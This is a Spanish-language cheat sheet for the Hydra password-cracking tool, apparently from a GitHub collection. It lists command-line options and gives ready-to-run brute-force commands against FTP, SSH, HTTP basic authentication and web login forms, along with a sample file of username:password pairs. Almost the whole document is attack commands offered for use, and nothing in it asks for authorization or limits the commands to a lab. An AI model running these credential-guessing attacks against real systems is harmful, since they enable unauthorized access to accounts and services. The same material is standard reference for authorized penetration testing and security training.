# Hydra Cheat Sheet

## Opciones

- `-s <port>` : Si el servicio está en un puerto diferente por default.
- `-l` : Especificar un usuario.
- `-L <userfile>` : Leer de un archivo listado de usuarios.
- `-p` : Especificar un password.
- `-P <passwordfile>` : Leer de un archivo listado de passwords.
- `-t <#tasks>`: Número de conecciones en paralelo por objetivo.
- `-M <targetsfile>` : Leer de un archivo listado de objetivos.
- `-o <file>` : Guargar el resultado en un archivo.
- `-vV` : Modo verbose, mostrando el inicio de sesión+contraseña para cada intento

## Ejemplos

#### Cracking con Brute Force en FTP Server
```
hydra -t 1 -l admin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ftp
```

#### Cracking con Brute Force en SSH Server
```
hydra -l msfadmin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ssh
```

#### Cracking con Brute Force en WEB Login Server
```
hydra -l none -P <PATH-TO-PASSWORD.lst> <IP-ADDRESS> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64
```

#### Ataque de Fuerza Bruta a una Authenticacion Basica
```
hydra -l admin -P <PATH-TO-PASSWORD.lst> -s 80 -f <IP-ADDRESS> http-get
```

#### Cracking con Brute Force en WEB Login Server, enviando 'usuario:password'
```
hydra -C credentials.txt <IP-ADDRESS> https-form-post "/login.php:username=^USER^&password=^PASS^:F=Login failed"

Archivo credentials.txt:
albert:password
juan:mypassword
beto:qwerty
.
.
.
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)